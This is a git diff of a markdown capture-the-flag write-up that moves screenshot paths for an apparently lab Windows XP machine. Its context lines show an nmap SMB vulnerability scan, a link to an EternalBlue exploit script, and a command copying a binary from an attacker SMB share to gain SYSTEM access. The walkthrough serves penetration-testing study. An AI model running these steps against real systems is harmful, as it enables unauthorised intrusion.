@@ -53,7 +53,7 @@ OS and Service detection performed. Please report any incorrect results at https
 ```
 **Smb vulnerabilities scan:** [nmap -sS -p139,445 10.10.10.4 -v --script vuln]:
 
-![smb_scan](images/smb_vuln_scan_legacy.png)
+![smb_scan](images/legacy/smb_vuln_scan.png)
 
 **Initial Shell Vulnerability Exploited: EternalBlue**\
 With the results of the nmap vulnerabilities scan, it seems like the machine is vulnerable to [MS017-10](https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py) (EternalBlue Exploit).
@@ -82,7 +82,7 @@ In this scenario, the machine uses Windows XP, and for unsupported Windows opera
 Windows XP, Microsoft recommends that users discontinue the use of SMBv1.
 
 **Initial Shell Screenshot:**\
-<img src="images/legacy_initialshell.png" alt="initial_shell_poc" width="500" height="150"/> </br> 
+<img src="images/legacy/initialshell.png" alt="initial_shell_poc" width="500" height="150"/> </br> 
 
 <!--Privilege Escalation:-->
 
@@ -101,4 +101,4 @@ copy '\\\10.10.14.39\a\whoami.exe'
 ```
 Ran the binary, as saw that I have NT AUTHORITY/SYSTEM privileges.\
 Proof Screenshot here: </br>
-![priv_esc_poc](images/legacy_privesc_poc.png)
+![priv_esc_poc](images/legacy/privesc_poc.png)
